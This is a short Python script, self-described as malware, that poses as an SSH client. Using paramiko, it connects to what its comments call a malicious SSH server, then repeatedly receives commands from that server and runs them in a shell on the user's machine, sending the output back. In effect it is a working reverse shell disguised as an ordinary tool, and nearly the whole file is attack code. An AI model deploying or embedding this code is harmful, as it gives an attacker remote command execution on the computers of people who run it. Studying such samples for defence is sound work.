#!/usr/bin/env python
#
# fake_sshclient.py - It simulates a ssh client, but opens
#   one port for the remote server to execute commands on
#   the user's computer. It's malware.
#
# Author            - José V S Carneiro
#
# ------------------------------------------------------------------
#
# Example:
#   $ fake_sshclient.py --ip 192.168.0.125 --username jose
#
# Change the ip address and username above by your own and
#   make sure the malicious ssh server is on.
#
# ------------------------------------------------------------------
#
# History:
#
#       Version 0.1 2023-04-03, José V S Carneiro, git@josevaltersilvacarneiro.net
#           - First Version
#
# Copyright: GPLv3

import argparse

import threading
import paramiko
import subprocess

import getpass

def ssh_command(ip, user, passwd, command = 'ClientConnected'):

    # using the paramiko lib
    # see https://docs.paramiko.org/en/stable/index.html
    client = paramiko.SSHClient()

    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, username=user, password=passwd)
    ssh_session = client.get_transport().open_session()

    if ssh_session.active:

        # notifies the server that the client is connected
        ssh_session.send(command)

        # shows the message `Welcome to Fake SSH`
        print(ssh_session.recv(1024).decode())

        while True:

            # get the command sent by the server
            command = ssh_session.recv(1024)

            # if the server sends the `exit` command,
            # break the loop and close the connection
            if command.decode() == 'exit':
                break
            
            try:
                # run the command in a shell subprocess
                cmd_output = subprocess.check_output(command, shell=True)

                # send the reply to the server
                ssh_session.send(cmd_output)
            except Exception as e:
                ssh_session.send(str(e))

        # closing the connection
        client.close()

if __name__ == '__main__':
    """Gets the arguments and calls ssh_command"""

    parser = argparse.ArgumentParser(
        description='Usage: fake_sshclient.py --ip [ip] --username [username] --passwd [password]'
    )

    parser.add_argument(
        '--ip',
        type=str,
        help='the ip address to which you want to connect',
        required=True
    )

    parser.add_argument(
        '--username',
        type=str,
        help='remote computer\'s username',
        required=True
    )

    args = parser.parse_args()

    passwd = getpass.getpass(f'Type {args.username}\'s password: ')

    ssh_command(args.ip, args.username, passwd)
